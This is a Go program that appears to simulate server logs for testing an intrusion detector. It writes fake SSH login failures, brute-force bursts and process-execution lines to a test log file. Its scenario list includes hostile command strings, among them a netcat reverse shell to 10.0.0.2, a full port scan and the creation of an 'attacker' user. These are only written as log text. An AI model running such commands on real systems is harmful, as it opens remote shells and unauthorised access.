package main

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"
)

const (
	logFile               = "testdata/auth.log"
	failedLoginTemplate   = "%s my-server sshd[%d]: Failed password for %s from %s port %d ssh2\n"
	acceptedLoginTemplate = "%s my-server sshd[%d]: Accepted password for %s from %s port %d ssh2\n"
	execsnoopTemplate     = "%s %-7d %-16s %-7d %-7d %-3d %s\n"
)

type Scenario struct {
	Name        string
	Command     string
	FullCommand string
	UID         int
}

func appendLog(message string) {
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed to open log file: %v", err)
	}

	defer f.Close()

	if _, err := f.WriteString(message); err != nil {
		log.Printf("failed to write to log file: %v", err)
	}
}

var suspiciousScenarios = []Scenario{
	{Name: "Network Scan", Command: "nmap", FullCommand: "nmap -p 1-65535 10.0.0.1", UID: 1000},
	{Name: "Reverse Shell", Command: "nc", FullCommand: "nc -e /bin/bash 10.0.0.2", UID: 1000},
	{Name: "User Creation", Command: "useradd", FullCommand: "useradd attacker", UID: 0},
	{Name: "Privilege Escalation", Command: "sudo", FullCommand: "sudo su -", UID: 1000},
}

func main() {
	log.Println("Starting log simulator....")

	for {
		sleepDuration := time.Duration(rand.Intn(4)+1) * time.Second
		time.Sleep(sleepDuration)

		scenario := rand.Intn(5)
		var logLine, logMessage string

		switch scenario {
		case 0:
			// Scenario: single suspicious command
			scenario := suspiciousScenarios[rand.Intn(len(suspiciousScenarios))]
			logMessage = fmt.Sprintf("Injecting: Suspicious command (%s)", scenario.Name)
			timestamp := time.Now().Format("15:04:05")
			pid, ppid := rand.Intn(9000)+1000, rand.Intn(90000)+1000
			logLine = fmt.Sprintf(execsnoopTemplate, timestamp, scenario.UID, scenario.Command, pid, ppid, 0, scenario.FullCommand)
			appendAndPrint(logMessage, logLine)
		case 1:
			// Scenario: rapid execution
			logMessage = "Injecting: Rapid Process Execution Burst"
			fmt.Print(logMessage)
			for i := 0; i < 15; i++ {
				timestamp := time.Now().Format("15:04:05")
				pid, ppid := rand.Intn(90000)+1000, rand.Intn(90000)+1000
				logLine = fmt.Sprintf(execsnoopTemplate, timestamp, 1000, "ls", pid, ppid, 0, "/bin/ls")
				appendAndPrint(logMessage, logLine)
				time.Sleep(100 * time.Millisecond)
			}
		case 2:
			logMessage = "Injecting: Successful Login for jsmith"
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			logLine := fmt.Sprintf(acceptedLoginTemplate, timestamp, pid, "jsmith", "193.99.144.80", port)
			appendAndPrint(logMessage, logLine)
		case 3:
			// Scenario: Brute force ssh attack (for checkFailedLogins)
			attackIP := fmt.Sprintf("198.51.100.%d", rand.Intn(254)+1)
			logMessage = fmt.Sprintf("Injecting: SSH Brute-Force from %s", attackIP)
			for i := 0; i < 6; i++ {
				timestamp := time.Now().Format("Jan  2 15:04:05")
				pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
				logLine := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
				appendAndPrint(logMessage, logLine)
			}

		case 4:
			// Single random failed Login
			logMessage = "Injecting: Random failed login"
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			ip := fmt.Sprintf("10.10.10.%d", rand.Intn(254)+1)
			logLine := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "admin", ip, port)
			appendAndPrint(logMessage, logLine)
		}
	}
}

func appendAndPrint(message, logLine string) {
	fmt.Print(message)
	appendLog(logLine)
	fmt.Println(" -> Done")
}
